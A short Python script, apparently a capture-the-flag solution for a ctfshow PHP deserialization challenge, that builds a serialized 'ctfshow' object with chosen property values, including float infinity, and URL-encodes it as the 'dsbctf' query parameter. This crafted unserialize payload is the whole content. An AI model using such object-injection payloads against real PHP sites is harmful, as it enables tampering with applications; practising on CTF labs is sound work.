import phpserialize
import urllib.parse

class_name = b'ctfshow'
props = {
    b'd': b'I',
    b's': b'N',
    b'b': b'F',
    b'ctf': float('inf'),
}

# 构造php对象
php_obj = phpserialize.phpobject(class_name, props)
payload = phpserialize.dumps(php_obj, charset="utf-8")

print("序列化字符串：")
print(payload.decode())

# 反序列化返回字典
def object_hook(name, d):
    return d  # 直接返回属性字典

obj_dict = phpserialize.loads(
    payload,
    charset="utf-8",
    decode_strings=True,
    object_hook=object_hook
)

print("\n反序列化后的属性字典：")
print(obj_dict)

# URL编码
encoded = urllib.parse.quote(payload)
print("\nurl参数：")
print(f"?dsbctf={encoded}")